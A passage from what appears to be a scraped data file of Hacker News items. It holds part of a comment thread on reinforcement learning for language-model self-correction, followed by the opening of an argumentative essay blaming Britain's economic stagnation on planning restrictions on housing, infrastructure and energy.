agorootparentprevNo. Many prediction machines can give you a confidence value on the full outcome. By the nature of tokenization and the casual inference (you build a token one at a time, and they're not really semantically connected except in the kv cache lookups, which are generally hidden to the user), the confidence values are thrown out in practice and even a weak confidence value would be hard to retrieve. I don't think it's impossible to obtain content with confidence assessments with the transformer architecture but maybe not in the way it's done now (like maybe another mayer on top). reply roboboffin 6 hours agorootparentprevIs this similar to the effect that I have seen when you have two different LLMs talking to each other, they tend to descend into nonsense ? A single error in one of the LLM's output and that then pushes the other LLM out of distribution. I kind of oscillatory effect when the train of tokens move further and further out of the distribution of correct tokens. reply vjerancrnjak 4 hours agorootparentThis is equivalent to the problem of maximum entropy Markov models and their application to sequence output. After some point you’re conditioning your next decision on tokens that are severely out of the learned path and you don’t even see it’s that bad. Usually this was fixed with cost sensitive learning or increased sampling of weird distributions during learning and then making the model learn to correct the mistake. Another approach was to have an inference algorithm that maximize the output probability, but these algorithms are expensive (viterbi and other dynamic programming methods). Feature modeling in NNs somewhat allowed us to ignore these issues and get good performance but they will show up again. reply diggan 5 hours agorootparentprev> Is this similar to the effect that I have seen when you have two different LLMs talking to each other, they tend to descend into nonsense ? Is that really true? I'd expect that with high temperature values, but otherwise I don't see why this would happen, and I've experimented with pitting same models against each other and also different models against different models, but haven't come across that particular problem. reply roboboffin 2 hours agorootparentI think this is similar to this point: https://news.ycombinator.com/item?id=41601738 That the chain-of-thought diverges from accepted truth as an incorrect token pushes it into a line of thinking that is not true. The use of RL is there to train the LLM to implement strategies to bring it back from this. In effect, two LLMs would be the same and would slow diverge into nonsense. Maybe it is something that is not so much of a problem anymore. Yann LeCun talks about how the correct way to fix this is to use an internal consistent model of the truth; then the chain-of-thought exists as a loop within that consistent model meaning it cannot diverge. The language is a decoded output of this internal model resolution. He speaks about this here: https://www.youtube.com/watch?v=N09C6oUQX5M Anyway, that's my understanding. I'm no expert. reply reportgunner 4 hours agorootparentprevCan you show examples ? In any AI related discussions there are only some claims by people and never examples of the AI working well. reply whimsicalism 3 hours agorootparentyou’re saying you have never seen an example of AI working well? reply sharemywin 5 hours agorootparentprevthis is like the human game of telephone. reply atq2119 6 hours agorootparentprevDoesn't that argument make the fundamentally incorrect assumption that the space of produced output sequence has pockets where all output sequence with a certain prefix are incorrect? Design your output space in such way that every prefix has a correct completion and this simplistic argument no longer applies. Humans do this in practice by saying \"hold on, I was wrong, here's what's right\". Of course, there's still a question of whether you can get the probability mass of correct outputs large enough. reply marcosdumay 5 hours agorootparentHow do you do this in something where the only memory is the last few things it said or heard? reply ziofill 5 hours agorootparentprevDoesn’t this assume that the probability of a correct answer is iid? It can’t be that simple. reply vbarrielle 5 hours agorootparentYes the main flaw of this reasoning is supposing that e does not depend on previous output. I think this was a good approximation to characterize vanilla LLMs, but the kind of RL in this paper is done with the explicit goal of making e depending on prior output (and specifically to lower it given a long enough chain of thought). reply hackerlight 4 hours agorootparentprevIt's quite fitting that the topic of this thread is self-correction. Self-correction is a trivial existence proof that refutes what LeCun is saying, because all the LLM has to say is \"I made a mistake, let me start again\". reply littlestymaar 5 hours agorootparentprev> * P(correct) = (1-e)^n * This diverges exponentially I don't get it, 1-e is between 0 and 1, so (1-e)^n converge to zero. Also, a probability cannot diverge since it's bounded by 1! I think the argument is that 1 - e^n converges to 1, which is what the law is about. reply vbarrielle 5 hours agorootparentP(correct) converges to zero, so you get almost certainly incorrect, at an exponential rate. The original choice of terms is not the most rigorous, but the reasoning is sound (under the assumption that e is a constant). reply hackerlight 3 hours agorootparentP(correct) doesn't go down with token count if you have self-correction. It can actually go up with token count. reply vjerancrnjak 7 hours agorootparentprev“Label bias” or “observation bias” a phenomenon where going outside of the learned path lives little room for error correction. Lecun talks about the lack of joint learning in LLMs. reply whimsicalism 3 hours agorootparentprevIt’s a thing in that he said it but it’s not an actual law and it has several obvious logical flaws. It applies just as equally to human utterances. reply mdp2021 6 hours agorootparentprevA reference could be this: https://futurist.com/2023/02/13/metas-yann-lecun-thoughts-la... (Speaking of \"law\" is rhetoric, but an idea is pretty clear.) reply seydor 5 hours agoparentprev\"never\" is not itself a problem, people do the same you only need to solve fusion correctly once reply og_kalu 6 hours agoparentprevIf you're talking about label bias then you don't need to solve label bias to 'solve' hallucinations when the model has already learnt internally when it's bullshitting or going off the rails. reply textlapse 3 hours agoprev [–] Using an intelligent algorithm to guide a dumb non-intelligent next word predictor is still a non-intelligent algorithm at the end of the day. Sure it’s sorting through garbage more elegantly but it’s still garbage at the end of the day. I was hoping the RL-like approach replaced the transformers-like approach or something but that’s a pipe dream. reply devoutsalsa 1 hour agoparent [–] PolishedTurd.ai reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Researchers introduced SCoRe, a multi-turn online reinforcement learning (RL) method to enhance self-correction in large language models (LLMs) using self-generated data.",
      "SCoRe addresses the limitations of supervised fine-tuning (SFT) by training under the model's own distribution, improving self-correction by 15.6% and 9.1% on MATH and HumanEval benchmarks, respectively.",
      "This advancement is significant as it reduces the need for multiple models or external supervision, making self-correction more efficient and effective."
    ],
    "commentSummary": [
      "A new paper discusses training language models to self-correct using reinforcement learning (RL), a method where models learn from their mistakes to improve future performance.",
      "This approach is compared to OpenAI's o1 model, which also uses RL to refine its reasoning and correct errors, although the exact methods and details differ.",
      "The paper highlights the challenge of guiding models to adopt self-correcting techniques rather than attempting to get the answer right on the first try, a significant step in improving language model accuracy and reliability."
    ],
    "points": 159,
    "commentCount": 73,
    "retryCount": 0,
    "time": 1726823980
  },
  {
    "id": 41600388,
    "title": "Foundations: Why Britain Has Stagnated",
    "originLink": "https://ukfoundations.co",
    "originBody": "Ben Southwood Samuel Hughes Sam Bowman Foundations Why Britain has stagnated Setting the scene Here are some facts to set the scene about the state of the British economy. Between 2004 and 2021, before Russia’s invasion of Ukraine, the industrial price of energy tripled in nominal terms, or doubled relative to consumer prices. With almost identical population sizes, the UK has under 30 million homes, while France has around 37 million. 800,000 British families have second homes compared to 3.4 million French families. Per capita electricity generation in the UK is just two thirds of what it is in France (4,800 kilowatt-hours per year in Britain versus 7,300 kilowatt-hours per year in France) and barely over a third of what it is in the United States (12,672 kilowatt-hours per year). We are closer to developing countries like Brazil and South Africa in terms of per capita electricity output than we are to Germany, China, Japan, Sweden, or Canada. Britain’s last nuclear power plant was built between 1987 and 1995. Its next one, Hinkley Point C, is between four and six times more costly per megawatt of capacity than South Korean nuclear power plants, and four times as expensive as those that South Korea’s KEPCO has agreed to build in Czechia. Tram projects in Britain are two and a half times more expensive than French projects on a per mile basis. In the last 25 years, France has built 21 tramways in different cities, including cities with populations of just 150,000, equivalent to Lincoln or Carlisle. The UK has still not managed to build a tramway in Leeds, the largest city in Europe without mass transit, with a population of nearly 800,000. At £396 million, each mile of HS2 will cost more than four times more than each mile of the Naples to Bari high speed line. It will be more than eight times more expensive per mile than France’s high speed link between Tours and Bordeaux. Britain has not built a new reservoir since 1992. Since then, Britain’s population has grown by 10 million. Despite huge and rising demand, Heathrow annual flight numbers have been almost completely flat since 2000. Annual passenger numbers have risen by 10 million because planes have become larger, but this still compares poorly to the 22 million added at Amsterdam’s Schiphol and the 15 million added at Paris’s Charles de Gaulle. The right to take off and land at Heathrow once per week is worth tens of millions of pounds. The planning documentation for the Lower Thames Crossing, a proposed tunnel under the Thames connecting Kent and Essex, runs to 360,000 pages, and the application process alone has cost £297 million. That is more than twice as much as it cost in Norway to actually build the longest road tunnel in the world. These are not just disconnected observations. They highlight the most important economic fact about modern Britain: that it is difficult to build almost anything, anywhere. This prevents investment, increases energy costs, and makes it harder for productive economic clusters to expand. This, in turn, lowers our productivity, incomes, and tax revenues. Everyone reading this will already be aware of the country’s present economic sclerosis. Real wage growth has been flat for 16 years. Average weekly wages are only 0.8 percent higher today than their previous peak in 2008. Annual real wages are 6.9 percent lower for the median full-time worker today than they were in 2008. This essay argues that Britain’s economy has stagnated for a fundamentally simple reason: because it has banned the investment in housing, transport and energy that it most vitally needs. Britain has denied its economy the foundations it needs to grow on. From 2010 to the summer of 2024, Britain was run by Conservative-led or Conservative Governments. The Conservatives are the traditional party of business, and in the 1930s and 1980s they pushed through reform programmes that successfully renewed Britain’s economy. Virtually any Conservative minister from the past fourteen years would speak warmly about that heritage if asked, and would express the hope of being its inheritor. And yet, with honourable exceptions, the governments of the last fourteen years failed in this vocation. Failing systems remained unreformed, continuing to stifle Britain’s prosperity. Today Britain is ruled by a Labour Government that recognises this failure to build, and which has articulated high ambitions for changing this. But it remains doubtful that they will be any better at delivering on those ambitions than the Conservatives were. Constitutionally, British governments have immense power. How has a series of governments with both the will and the means to deliver systemic reform failed to do so? How can it be that the overwhelming experience reported by former ministers and advisors is one of disempowerment – of a ‘blob’ operating beyond their control, of pulling levers and nothing happening, of a vast dysfunctional machine slowly disintegrating on autopilot? We believe that Britain’s political elites have failed because they do not understand the problems they are facing. No system can be fixed by people who do not know why it is broken. Like the elites of Austria-Hungary, Qing Dynasty China, or the Polish Commonwealth, they tinker ineffectually, mesmerised by the uncomprehended disaster rising up before them. If any government, Conservative or Labour, wishes to use its powers to improve the country, it needs to understand which of Britain’s institutions have failed, and why they have done so. Only then can they begin to develop a systematic programme of reform that will restore Britain’s economy to strength and its society to vitality. The alternative is continued drift, relative decline, political disenchantment, and a nation unable to meet the great challenges of our time. This essay is a first attempt at offering such a diagnosis. Falling behind Britain is a country of immense achievement. For most of modern history, its people were the richest, healthiest and best educated in the world. Its housing stock and its infrastructure was far more advanced than those of any of its rivals. It led the Scientific and Industrial Revolutions. Its institutions were almost uniquely liberal. Though British history contains its share of missteps and tragedies, there is probably nowhere else on earth that matches its achievements since the mid-eighteenth century, relative to its size and resource endowments. Many of these underlying strengths remain. The British people value debate and heterodoxy. They respect science, law and institutions. In hours of crisis, like the Russian invasion of Ukraine, they display unity and good sense. However inefficient and dysfunctional they may be, British institutions are strikingly incorruptible. One of the scandals of the decade is the alleged embezzlement of a campervan, an offence that would surely bring a contemptuous smile to the lips of a Putin or a Berlusconi. Despite these strengths, Britain is falling behind the developed world in economic dynamism. It led the world in the nineteenth century, and then Europe during the first half of the twentieth, but it lost its leadership after the Second World War. Since 2008, it has been clearly underperforming most of the developed world, even some of its more heavily taxed and regulated continental neighbours. Most popular explanations for this are misguided. The Labour manifesto blamed slow British growth on a lack of ‘strategy’ from the Government, by which it means not enough targeted investment winner picking, and too much inequality. Some economists say that the UK’s economic model of private capital ownership is flawed, and that limits on state capital expenditure are the fundamental problem. They also point to more state spending as the solution, but ignore that this investment would face the same barriers and high costs that existing infrastructure projects face, and that deters private investment. Others believe that our ageing society means permanently lower growth and higher taxes. Dietrich Vollrath’s book Fully Grown: Why a Stagnant Economy is a Sign of Success says that slower growth is an inevitable part of becoming services-driven (and of birth rates declining). Another school of thought sees Britain’s 2010s performance as ‘one thing after another’, with a slow recovery from the financial crisis followed by Brexit, followed by Covid. But all of these explanations take the biggest obstacles to growth for granted. Our economy isn’t growing for the same reason that no more planes take off or land at Heathrow today than did twenty years ago: at some point it becomes impossible to grow when investment is banned. Over the past two decades, Britain’s economy has needed a huge quantity of new housing, transport infrastructure and energy supply. Its postwar institutions have manifestly failed to deliver these. Britain is now a place in which it is far too hard to build houses and infrastructure, and where energy is too expensive. This has meant that our most productive industries have been starved of the resources, investment and talent – the economic foundations – that they need to grow. The UK faces other challenges besides these. Our healthcare and higher education systems are so broken that politicians elected on a clear mandate to cut migration instead let it rise to unprecedented levels to keep them afloat. Crime, though it has been falling for years, is substantially higher than it was in pre-Second World War Britain, despite a far older population. It is also significantly higher than in many other European countries including the Netherlands, Spain, Austria, Switzerland, Norway, and Italy. Childcare is so expensive that many families have fewer children, and later in life, than they would like. Our tax system is riddled with distortions and perverse incentives. There is no consensus about what our higher education system is supposed to do, who should benefit from it, and who should pay. And our political institutions are sclerotic: at best, many are unable to perform their most basic functions; at worst, they are a huge barrier to innovation and effective governance. But these other challenges do not explain why a huge economic gap opened up between us and other leading economies, since problems in immigration, crime, childcare, tax, and political institutions are also found in exactly the countries that have pulled away from Britain economically since 2008. Nor can austerity or the hangover from the financial crisis explain Britain’s malaise. The financial crisis was at least as turbulent in the United States as here. And austerity was at least as tough across Europe, which also had to fend with the euro crisis. The Office for Budget Responsibility’s estimate of the impact of Brexit says that it will knock four percent off long-run UK productivity. This would be very painful, but still only a small fraction of the growth we have missed over the past fifteen years. (It also does not factor in the positive effect of avoiding destructive regulations like the EU Artificial Intelligence Act and Digital Markets Act.) Britain’s startling underperformance more recently is explained by the more basic factors this document focuses on: preventing investment into housing, infrastructure, and energy supply. Prosperity is intrinsically important. It gives people security and dignity, leisure and comfort, opportunity and economic freedom. It gives us freedom to pursue our other national goals: caring for older and less fortunate members of society, upholding a law-governed international order, preserving and enhancing our landscapes and townscapes, and leading the way in world-changing scientific research. But there is even more at stake here than that. We noted above the enduring strengths of the British social settlement – responsibility, autonomy, love of debate, respect for the individual. Economic failure saps confidence in these things. It begets dependency, resentment, defeatism, division and bitterness. It turns win-win relationships into zero-sum ones, where someone else must fail for you to succeed. Economic reform is not only the key to prosperity: it is the key to preserving and amplifying what is valuable about our society itself. A short history of British productivity Britain’s biggest problem is its low productivity – that is, the value of the goods and services people produce per hour they work. Before the pandemic Americans were 34 percent richer than us in terms of GDP per capita adjusted for purchasing power, and 17 percent more productive per hour. (Purchasing power parity, or PPP, attempts to account for differences in purchasing power between countries, rather than just using exchange rates). The gap has only widened since then: productivity growth between 2019 and 2023 was 7.6 percent in the United States, and 1.5 percent in Britain. This is not a general Western European problem either: the French and Germans are 15 percent and 18 percent more productive than us respectively. Historically, this is exceptional. For most of modern history, Britain has been more productive than its peers, and when it has started to fall behind, it has successfully reformed itself to regain its advantage. Between the mid-eighteenth century and the late nineteenth century, Britain was the world’s leading economy. Though it was overtaken by the United States by the beginning of the twentieth century, it remained Europe's leading economy until the early 1950s, with the continent’s highest productivity and living standards, and its most advanced innovating firms. Output per capita, current prices, 1773-1940. Britain led the world until taken over by the USA. But it still led Europe at the beginning of the Second World War. But the reforms of the late 1940s, largely under Clement Attlee’s governments, caused Britain to grow more slowly than any other major European country and the US until the mid-1980s. Britain was overtaken by Germany, France, the Netherlands, Belgium, Denmark, Italy and Switzerland. Output per capita, current prices, 1947-1980. Britain entered the postwar era with a huge advantage over Europe, which it rapidly lost, falling behind both France and Germany Privatisation, tax cuts, and the curbing of union power fixed important swathes of the UK economy. Crucially, they tackled chronic underinvestment in sectors that had been neglected under state ownership. Political incentives under state ownership encouraged underfunding – and where the Treasury did put money in, it tended to go on operational expenditures (e.g., unionised workers’ wages rather than capital investments). This problem has immediately reemerged as the Department for Transport has begun to nationalise various franchises (which it promises to do to all of them). Between 1980 and 2008 Britain returned to its position as one of Europe’s most successful large economies. For the most part, Tony Blair’s governments were able to sustain these advances. In 2005 Britain’s GDP per capita was just 2.8 percent behind Germany’s, in purchasing power parity terms, and fully 20 percent higher in US dollar terms, according to the World Bank. Penn World Tables, the other major source, have the UK overtaking Germany on GDP per capita in the mid-2000s. Britain’s relative success during this period is clearest when compared to other major economies. The chart below shows GDP per capita in France, Germany, Italy and the UK as a percentage of US GDP per capita. It shows Britain, after decades of relative stagnation, beginning to converge on the United States and overtake the other European countries from the early 1980s. Britain’s change of fortunes under Thatcher, and continued improvement under Blair, is clear. But crucial parts of the economy were still left unfixed – notably land-use planning policy, which Thatcher’s Environment Secretary Nicholas Ridley had tried and failed to reform, and which Tony Blair’s government was unable to make a dent in either. This left Britain with latent weaknesses that have become hugely problematic over the last quarter of a century. Since the 1990s, Britain has experienced rapid population growth, after decades of demographic stability, and big shifts in prosperity from some parts of the country to others. The decision to transition away from fossil fuels has created the need for huge quantities of new energy infrastructure, recently exacerbated by the war in Ukraine, but by no means beginning then. Across the developed world, great metropolitan agglomerations have become even more economically important. London has been among the biggest winners from this trend, in spite of the obstacles in its way. What Britain needed in the last 25 years above all was a huge amount of building – of homes, energy supply, and transport infrastructure. Without it, Britain has fallen behind, weighed down by a development system that worked badly even in the 1950s and 60s, and that is positively disastrous today. That gap continues to grow. Between 2010 and 2019, worker productivity grew by eight percent in the United States, 9.6 percent in France and just 5.8 percent in Britain. And those countries’ growth rates pale in comparison to that of Poland, which has grown its productivity by 29.7 percent between 2010 and 2019, and on current trends will overtake Britain by the end of this decade. To put the shortfall since 2008 into perspective, if Britain had grown in line with its trend between 1979 and 2008, it would be 24.8 percent more productive today. Assuming we continued working the same hours annually, that would mean a GDP per capita of £41,800 instead of £33,500, making the typical family about £8,700 better off before taxes and transfers. Tax revenues would be £1,282 billion instead of £1,027 billion, assuming tax rates are held constant. That would mean that, instead of a deficit of £85 billion, on current spending we would have a surplus of £170 billion, meaning that taxes could be much lower, and public services could be better funded. Though these figures may seem improbably high, they are not out of line with the world’s richest economies, and there is no reason Britain should not aim to sit among them as it once did. This essay argues that Britain can do so by adopting a programme of reform similar in its scale of ambition to that of the programme of liberalisation in the 1980s. Where earlier reforms were focused on cutting taxes, curbing the power of the trade unions, and privatising state-run industries, this time we must focus on making it easier to invest in homes, labs, railways, roads, bridges, interconnectors, and nuclear reactors. The importance of strong foundations Why is France so rich? France is notoriously heavily regulated and dominated by labour unions. In 2023, the country was brought to a standstill by strikes against proposals to raise the age of retirement from 62 to 64. French workers have been known to strike by kidnapping their chief executives – a practice that the public there reportedly supports – and strikes are so common that French unions have designed special barbecues that fit in tram tracks so they can grill sausages while they march. France is notoriously heavily taxed. Factoring in employer-side taxes in addition to those the employee actually sees, a French company would have to spend €137,822 on wages and employer-side taxes for a worker to earn a nominal salary of €100,000, from which they would take home €61,041. For a British worker to take home the same amount after tax (£52,715, equivalent to €61,041), a British employer would only have to spend €97,765.33 (£84,435.6) on wages and employer-side taxes. And yet, despite these high taxes, onerous regulations, and powerful unions, French workers are significantly more productive than British ones – closer to Americans than to us. France’s GDP per capita is only about the same as the UK’s because French workers take more time off on holiday and work shorter hours. What can explain France’s prosperity in spite of its high taxes and high business regulations? France can afford such a large, interventionist state because it does a good job building the things that Britain blocks: housing, infrastructure and energy supply. Housing supply is vastly freer in France. Overall, it now has about seven million more homes than Britain (37 million versus 30 million), with the same number of people. Those homes are newer, and are more concentrated in the places people want to live: its prosperous cities and holiday regions. The overall geographic extent of Paris’s metropolitan area roughly tripled between 1945 and today, whereas London’s has grown only a few percent. France has allowed its other great cities to grow and flourish too, whereas Britain has systematically constrained and undermined them for seven decades. Paris, 1937 and today: the 1937 map is inset in the contemporary one. Everything outside the centre is still new. London is almost unchanged in surface area today from 1937. Transport infrastructure is now better there: there are seven British tram networks, versus 29 in France. Six French cities have underground metro systems, against three in Britain. Since 1980, France has opened 1,740 miles of high speed rail, compared to just 67 miles in Britain. France has nearly 12,000 kilometres of motorways versus around 4,000 kilometres here – and French motorways tend to be smoother and better kept (and three quarters are tolled, making congestion much less of a problem). In the last 25 years alone, the French built more miles of motorway than the entire UK motorway network. They are even allowed to drive around 10 miles per hour faster on them. Energy is more abundant and, thanks to the country’s nuclear roll-out from the 1970s, the country has already done a lot of decarbonisation. Seventy percent of the country’s electricity comes from nuclear power, which does not suffer from the intermittency problems that wind and solar power both face, which drive up their costs significantly since they require energy storage and backup fossil fuel generation. Britain was the first country to split the atom, and built the world’s first commercial nuclear power plant that supplied energy to a national grid, opened by the late Queen in 1956. In the following decade, Britain built ten more nuclear power stations. In 1965, we had more operational nuclear reactors than the USA, the USSR, and every other country in the world put together, yet we haven’t finished a new nuclear power station in almost three decades. Because France gets these big things right, it can afford to get a lot of other things wrong. If Britain could catch up with France on housing, infrastructure and energy, without making the sort of mistakes it makes on regulation and tax, the implication is that we could be far richer than they are, as we were for centuries before the 1950s. Weak foundations: investment, housing, infrastructure and energy Britain gets many of the important things for prosperity right. Businesses from around the world come here to draw on our legal regime, low levels of corruption, centuries-old commitment to free trade, efficient financial sector, and world-leading scientific research ecosystem. Our time zone allows us to talk to Asia, Africa, and the Americas all in one day, and everyone here is fluent in the modern world’s lingua franca. As the economist Tyler Cowen said, England remains ‘one of the few places where you can really birth and execute a new idea’. This is unbelievably precious, rare, and difficult to create. But we fail to capitalise on these rare advantages because the economy lacks the most important foundations: private investment is blocked from going where it could generate the highest returns, meaning we have lower investment than all our peer economies; in particular we do not allow investment in the infrastructure we need to allow people to access prosperous areas, the houses they need to live there, and the offices, labs, factories, and warehouses they need to work there, which, together with our high and rising energy costs, stop the companies in those cities reaching their full potential. Britain’s best chance of achieving rapid economic growth in the near term is via a combination of higher private investment, more agglomeration – that is, greater clustering of economic activity in productive places – and lower energy costs. These economic foundations are important determinants of how productive workers and businesses are. No individual by themselves can create much value, no matter how gifted or hardworking they might be. They need to combine their efforts with machinery and other people to really succeed. Investment rates determine the amount and quality of the tools they can use; energy costs determine how they can use them; and agglomeration – including both housing and infrastructure – determines who they can use them with. Output per capita, current prices, 1990-2022. Those middle-income countries that have decent institutions have been rapidly converging on Britain These policies are a complement to Britain’s most advanced frontier sectors. More agglomeration drives higher rates of innovation, and increases the choices that businesses have about who to hire. Lower energy costs make certain high-tech sectors more viable, such as advanced manufacturing and AI training. Higher rates of investment into businesses make it easier for smaller companies to rapidly scale up into giants. Rapid economic growth is possible for Britain. Because what we get wrong is so mundane and straightforward, fixing these problems would allow Britain to experience similar rapid ‘catch-up’ growth that countries like South Korea, Estonia, and Poland have experienced over the past thirty years. Investment Investment is when we forgo resources that we would consume today, and instead use them to produce more resources in the future. It is the life-blood of economic growth, and of individual businesses’ successes. Investment is not just what happens after we build sufficient roads, houses, pylons, and power plants: building those things is investment. What is good about building these things is not that they cost money, and what matters is not how much money we spend on investment. It is the things we actually produce, and the benefits they give us, that are valuable: the easier and less expensive it is to build them, the higher the return we get for a given amount of money invested, and the better it is to spend money on them. Britain does invest at a lower rate than most other advanced countries. In 2022, France spent (across both public bodies and private companies) 26 percent of its GDP on physical capital investment; Germany 25 percent; OECD members 23 percent on average; the United Kingdom just 19 percent. The total capital stock of the UK is actually lower now than it was in 2016; by comparison, it is 14 percent higher on average across the rest of the G7. The most important reason for this is not that we are inherently penny-pinching and short-termist, where Americans and Europeans are not. It is that we have banned most of the most productive investments we could make, made it eye-wateringly expensive to do the ones we do allow ourselves to make, and allowed many publicly-managed assets to be neglected. These problems have been present for more than half a century. In the postwar decades, the British state chronically failed to invest in the various companies it had nationalised, succumbing to the permanent temptation of politicians to allocate resources to frontline services (i.e. immediate consumption) rather than investing for the long term. We see this every year with the NHS, whose operational budget continues to rise, but which has the fewest MRI and CT scanners of any developed country’s healthcare system, and by far the least machinery and equipment overall. British Rail ran in 1994 a third as many trains between London and Manchester as did private franchises by the 2010s – overall passenger numbers fell steadily between nationalisation in 1948 and privatisation in 1994, after which point they have more than doubled. Many state-run British industries became efficient in terms of economising on the scarce resources they were allowed, but extremely inefficient in terms of overall productivity. The privatisations of British Steel, British Airways, British Gas, British Telecoms and many other nationalised companies in the 1980s and 90s thus opened up great opportunities. From 1981 to 1990, British capital investment grew faster than any other country in the OECD barring booming Japan and tiny Luxembourg. Contrary to what is sometimes claimed, North Sea oil and gas was not the biggest part of this, with investment in it actually falling over this period. Investment levels rose chiefly because state mismanagement had left so many opportunities untaken in the preceding decades – opportunities that privatisation opened up. Underinvestment leads to particularly acute problems in places like the North of England that have historically prospered from capital-intensive industries. These areas have the same underlying features that generate industrial heartlands elsewhere, like in Germany and Sweden: relatively cheap land, proximity to waterways, roads and rail networks, and – unlike many other parts of Britain – cheap, abundant housing. But expensive energy and the difficulty of building new premises, warehouses, factories, pipelines, pylons, distribution centres, and so on holds them back. Some of this underinvestment is due to distortions in the tax code that penalise capital investments. Prior to the introduction of full expensing, British businesses that invested in machinery, buildings and acquired patents could only claim back 62 percent of the costs from their corporation tax bill (compared to 100 percent for operating expenses like rent or wages), which meant that despite the UK having a low headline rate of corporation tax, the effective rate on profits generated via physical investments was still high. The introduction of full expensing has corrected this for some investments, but still does not apply to buildings or machinery with an expected lifespan of over twenty-five years. Business rates, meanwhile, have the effect of increasing the tax liability when most property enhancements are made, regardless of when or if they become profitable. Some of the underinvestment is due to higher input costs, such as the high cost of energy, discussed later. This is most acutely a problem for the manufacturing sector, where high energy costs have made many industries unviable in Britain, while they thrive in other advanced economies. But the most important reason Britain sees underinvestment today is that the state bans the very investments that would be most valuable. If allowed, private investors would be rushing to build housing, transport infrastructure and energy infrastructure. France’s thousands of miles of motorways were built, and are operated by, private companies. Britain’s roads, canals, and railways were originally built this way. If done today, this would show up as enormous amounts of capital investment in the national accounts. But as we will show, building these things is prohibited in the vast majority of cases in which it would be economically rational. If we change that, Britain would see an enormous construction boom as suppressed demand for these things was met, and the resulting capital assets would continue contributing to the economy indefinitely. Improving the UK’s investment rate would bring great benefits: about half the shortfall in productivity growth since the financial crisis can be attributed to underinvestment in (tangible) capital, while much of the rest is likely to be due to the shortfall in intangible investments like R&D. Investment is what makes us richer over time. Any successful economic plan will have to unleash it in order to succeed. But even as the need for higher investment becomes more widely accepted by Britain’s economic commentators, they tend to propose more quangos and subsidies to tackle the problem, because they miss two crucial points. First: private investment is far more significant than government investment. Public investment can be extremely important, especially in areas that have large spillovers to the broad economy, but which do not always generate a private return. But more than 80 percent of investment in the UK and most other developed countries is done by the private sector. Public investment was 18.0 percent of the UK total in 2021, 17.6 percent in 2020, and 15.5 percent in 2019. And second: apart from taxes on investment like corporation tax and capital gains tax, higher investment in the UK is mainly frustrated by systems that effectively ban private companies from doing it (like building houses, infrastructure, and energy generation), rather than being down to short-sightedness by these businesses, or a lack of generosity by government. Commentators have searched far and wide for explanations of Britain’s investment problem. But the explanation was before our eyes all along. Buildings, energy and transport infrastructure are the investments that Britain most needs, and they are largely banned. In banning them, we have generated higher costs for a range of other investments too. There is no need to posit esoteric cultural problems among British businesspeople, no need for a dozen more government strategies, deals and consultations. We don’t need to pay businesses to invest more. We just need to stop banning them from doing so. Housing Why we’re not building enough homes in the right places For centuries, Britain had a development control system that supported urban growth in the places with the most successful industries, as well as building beautiful cities that we treasure today. Since 1947, however, Britain has had probably the most restrictive development control system in the world. This has held back our strongest sectors and businesses and stopped people from moving to the places with the best jobs. On its own, we see it as the largest cause of British stagnation. Throughout Britain’s history, its economic centre of gravity has changed, sometimes profoundly. During the 1800s, millions of people migrated to the cities of the Midlands, Wales, and especially the North of England, where the Industrial Revolution was revolutionising the world economy. Cardiff grew by around 1,000 percent in 45 years as people moved near the coal that enabled heavy industry. Manchester grew from 90,000 in 1800 to 700,000 in 1900, in part due to the soft water that enabled Lancashire’s world-beating cotton textiles. Liverpool grew by over 1,000 percent between 1800 and the 1930s. This process continued in the 1930s, but as different industries came to the fore, different locations were predominant. Cities like Birmingham, Coventry, London, Leicester, and Nottingham expanded at breakneck pace as the link with raw materials was broken, and jobs shifted to offices and factories in the South and Midlands. Immense suburbs sprang up, with their characteristic long gardens and semi-detached houses. Private companies and local councils laid out a vast system of commuter rail, electric trams and motorbuses that enabled and served these new neighbourhoods. The English housing stock nearly doubled in twenty years, transforming the living standards of the English people. As late as the 1930s, there were almost no restrictions on development, other than generous height limits in some cities (about ten storeys) and some building safety regulations. Subject to those, any property owner could build virtually anything they wanted. After 1909, developers did have to get permission to develop, but councils almost always gave it, since they had to compensate landowners for the lost value if they rejected permissions, and councils were themselves generously compensated through local property taxes if they accepted development. In sum, before the 1940s, British cities grew as their industries did. People moved, in their millions, around the country. People moved to places where wages were higher, raising wage competition for workers in the places that they left. This meant that there were fewer and narrower persistent income differences between places than those we see today. Liberal development policy generated a country with a natural force pushing against persistent, entrenched regional inequality, which was narrowing in the decades to the 1940s and has been widening since. The source of the problem In 1947, the Town and Country Planning Act (TCPA) was introduced, part of the postwar reform programme that nationalised nearly every major industry, from steel to man-with-van road haulage companies, and normalised top tax rates at over 90 percent. The TCPA completely removed most of the incentive for councils to give planning permissions by removing their obligation to compensate those whose development rights they restricted. Other reforms at around the same time also redistributed away much of the upside that councils had received from development through local property taxes. The law also added a requirement to get permission from national government for any development, and to pay to the national government a tax of 100 percent on any value that resulted from permission being granted. Most notoriously, the TCPA instituted the legal powers that were used to create and expand green belts the following decade, prohibiting development on large rings of land around England’s cities.1 Overall, it moved Britain from a system where almost any development was permitted anywhere, to one where development was nearly always prohibited. Despite some minor later liberalisations, like the introduction of permitted development rights in the 1980s, the underlying problem remains. Since the TCPA was introduced in 1947, private housebuilding has never reached Victorian levels, let alone the record progress achieved just before the Second World War. Today, local authorities still have robust powers to reject new developments, and little incentive to accept them. Historically, local governments encouraged development because their tax bases grew in line with the extra value created, but this incentive has been eroded by successive reforms that have centralised and capped local governments’ tax-raising powers. National governments have not been blind to the fact that development is not happening. Their solution to the problem has generally been to try to force local governments to permit the homes the country needs (and take the political flak that engenders) through targets and punishments. But this system has never managed to raise building rates by anywhere near enough to return prices to the downward trend they were on for hundreds of years until 1938. Attempting to force local governments to build more homes has repeatedly backfired, and where it has delivered new homes they have often been low quality and far from where the highest demand for homes is, since the targets are calculated with almost no reference to actual demand for new houses. There is little reason to think the new government’s plans will be very different, and its decision to lower London’s target as a ‘reward’ for failing to meet its previous targets is a sign that it, too, will fail to build homes where they are needed most. Local people bear many of the costs of new development – disruption, congestion, and competition over access to state-provided services like healthcare and education. At the same time, they gain few or none of the benefits, the obvious exception being those local landowners who actually receive the planning permissions. It is thus unsurprising that local people tend to be fierce opponents of development. When the national government has tried to take away their right to control development nearby, they have resisted vigorously, usually succeeding in having the targets revoked or watered down. This has contributed to a climate that is supportive of continual increases in regulations at the national level, which add process and cost to development. Recently, this has meant compulsory second staircase requirements, which ban apartment blocks with only one staircase and lift core – the standard type in nearly every country in the developed world. (The Government’s own impact assessment of the second staircase rules determined that their costs would be more than two hundred times greater than their benefits.) It has also meant reducing the sizes of windows: it is now legally difficult to build windows as large as those common in Georgian and Victorian 